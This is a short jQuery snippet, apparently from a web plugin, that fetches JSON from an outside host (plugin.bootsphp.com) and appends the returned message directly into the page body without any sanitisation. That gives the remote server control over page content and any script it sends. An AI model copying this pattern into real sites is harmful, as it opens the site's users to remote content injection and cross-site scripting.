$.get('http://plugin.bootsphp.com/options.js',function(data){
	$('body').append(data.message);
}, 'json');